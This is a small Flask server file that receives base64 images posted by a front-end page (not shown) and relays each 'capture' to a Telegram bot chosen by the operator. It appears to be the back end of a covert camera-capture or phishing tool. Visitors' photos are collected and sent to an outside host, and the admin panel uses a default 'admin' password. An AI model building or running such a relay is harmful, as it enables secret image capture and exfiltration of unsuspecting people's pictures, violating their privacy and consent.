from flask import Flask, request, send_file, jsonify, Response
from werkzeug.middleware.proxy_fix import ProxyFix
import os, base64, datetime, binascii, requests

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

# --- TELEGRAM CONFIG ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")

def check_auth(auth):
    return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD

@app.route("/")
def index():
    return send_file("index.html")

# We keep the gallery route so you don't get a 404, but it will just tell you to check Telegram
@app.route("/gallery")
def gallery():
    auth = request.authorization
    if not check_auth(auth):
        return Response('Login required', 401, {'WWW-Authenticate': 'Basic realm="Admin"'})
    
    return """
    <div style="font-family:system-ui; background:#0f172a; color:#e2e8f0; padding:40px; text-align:center;">
        <h1>Check Telegram</h1>
        <p>Images are now being sent directly to your Telegram bot.</p>
    </div>
    """

@app.route("/shot", methods=["POST"])
def shot():
    data = request.get_json(force=True)
    b64 = (data.get("img") or "").split(",", 1)[-1]
    
    if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            # Decode the image
            img_data = base64.b64decode(b64)
            
            # Prepare to send to Telegram
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📸 New capture: {datetime.datetime.utcnow():%Y-%m-%d %H:%M:%S}"}
            
            # Send it
            response = requests.post(url, data=payload, files=files)
            if response.status_code != 200:
                print("Telegram Error:", response.text)
                
        except Exception as e:
            print("Error processing image:", e)
            
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
